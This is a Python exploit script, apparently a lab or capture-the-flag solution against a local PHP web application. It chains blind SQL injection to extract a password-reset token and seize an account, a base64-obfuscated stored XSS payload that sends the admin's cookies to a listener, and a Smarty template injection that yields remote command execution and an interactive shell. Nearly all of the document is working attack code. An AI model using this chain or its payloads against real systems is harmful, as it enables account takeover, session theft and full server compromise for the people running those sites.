import requests
import re
import socket
import base64
import time

# login bypass
target = "http://localhost:8000"
LISTEN_IP = "127.0.0.1"
LISTEN_PORT = 8001

ATTACKER_USER = "user1"
ATTACKER_PASS = "user1newpw"

requests.post(f"{target}/forgotpassword.php", data={"username": ATTACKER_USER})

def oracle(query):
    r = requests.post(
        f"{target}/forgotusername.php",
        data={"username": f"{query};--"}
    )
    return "User exists!" in r.text

uid = 0
while not oracle(f"{ATTACKER_USER}' and uid={uid}"):
    uid += 1
print(f"UID: {uid}")

token = ""
for i in range(32):
    low, high = 48, 122
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"{ATTACKER_USER}' and (select ascii(substring(token,{i+1},1)) from tokens where uid={uid} order by tid limit 1)>'{mid}'"):
            low = mid + 1
        elif oracle(f"{ATTACKER_USER}' and (select ascii(substring(token,{i+1},1)) from tokens where uid={uid} order by tid limit 1)<'{mid}'"):
            high = mid - 1
        else:
            token += chr(mid)
            print(chr(mid), end='', flush=True)
            break
print()

r = requests.post(f"{target}/resetpassword.php", data={"token": token, "password1": ATTACKER_PASS, "password2": ATTACKER_PASS})
print(f"Done: {r.text.strip()}")

# admin privilege escalation
session = requests.Session()
r = session.post(
    f"{target}/login.php",
    data={"username": ATTACKER_USER, "password": ATTACKER_PASS},
    allow_redirects=False
)

if r.status_code != 302:
    print(f"Can't log in as {ATTACKER_USER}")
    exit()

print(f"Logged in as {ATTACKER_USER}")

js_code = f"fetch('//{LISTEN_IP}:{LISTEN_PORT}/'+btoa(document.cookie))"
base64_js = base64.b64encode(js_code.encode()).decode()
xss_payload = f"<img src/onerror='eval(atob(`{base64_js}`))'/>"
print(f"XSS payload created")

r = session.post(
    f"{target}/profile.php",
    data={"description": xss_payload}
)

if "Success" not in r.text:
    print("[-] Nije uspjelo postavljanje payload-a!")
    print(f"    Response: {r.text[:200]}")
    exit()

server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((LISTEN_IP, LISTEN_PORT))
server.listen()

print("Waiting for admin to log in...")

try:
    client, addr = server.accept()
    print(f"Connected to {addr}")
    
    podaci = client.recv(4096)
    print(f"Request: {podaci[:100]}...")
    
    cookie_base64 = podaci.split(b" ")[1][1:].split(b"HTTP")[0]
    admin_cookie = base64.b64decode(cookie_base64).decode()
    
    print(f"Admin cookie: {admin_cookie}")
    
except Exception as e:
    print(e)
    
finally:
    server.close()

# rce

rce_payload = "{php}passthru($_POST['cmd']);{/php}"

if admin_cookie:
    cookie_dict = {}
    for pair in admin_cookie.split(';'):
        if '=' in pair:
            k, v = pair.strip().split('=', 1)
            cookie_dict[k] = v
    admin_session = requests.Session()
    admin_session.cookies.update(cookie_dict)

r = admin_session.post(
    f"{target}/admin/update_motd.php",
    data={"message": rce_payload}
)
print(f"Smarty payload injected")

r = admin_session.post(
    f"{target}/index.php",
    data={"cmd": "id"}
)
print(f"RCE (id): ")
lines = r.text.split('\n')
for line in lines:
    if 'uid=' in line or 'www-data' in line:
        print(f"    {line.strip()}")

while True:
    try:
        cmd = input("shell$ ")
        if not cmd:
            continue
        r = admin_session.post(f"{target}/index.php", data={"cmd": cmd})
        
        raw = r.text
        
        match = re.search(r'center_div"></a>(.*?)<', raw, re.DOTALL)
        if match:
            output = match.group(1).strip()
            print(output if output else "(no output)")
        else:
            no_tags = re.sub(r'<[^>]+>', '\n', raw)
            lines = [l.strip() for l in no_tags.split('\n') if l.strip()]
            print(lines[0] if lines else "(no output)")
            
    except KeyboardInterrupt:
        print("\n Goodbye.")
        break